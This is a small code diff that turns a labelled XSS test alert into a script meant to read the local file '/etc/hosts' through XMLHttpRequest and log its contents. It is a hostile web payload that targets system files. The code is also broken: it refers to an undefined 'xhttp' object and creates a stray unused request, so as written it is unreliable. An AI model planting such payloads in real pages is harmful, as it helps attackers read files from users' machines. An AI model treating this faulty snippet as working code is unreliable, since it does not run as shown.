@@ -1,3 +1,13 @@
 <script>
-	alert("XSS by nipe")
+	function getfile(filepath){
+		var request = new XMLHttpRequest();
+		request.onreadystatechange = function() {
+			var t = new XMLHttpRequest();
+			console.warn(this.responseText);
+		};
+		xhttp.open("GET", filepath, false);
+		xhttp.send();
+	}
+
+	getfile("file:///etc/hosts")
 </script>
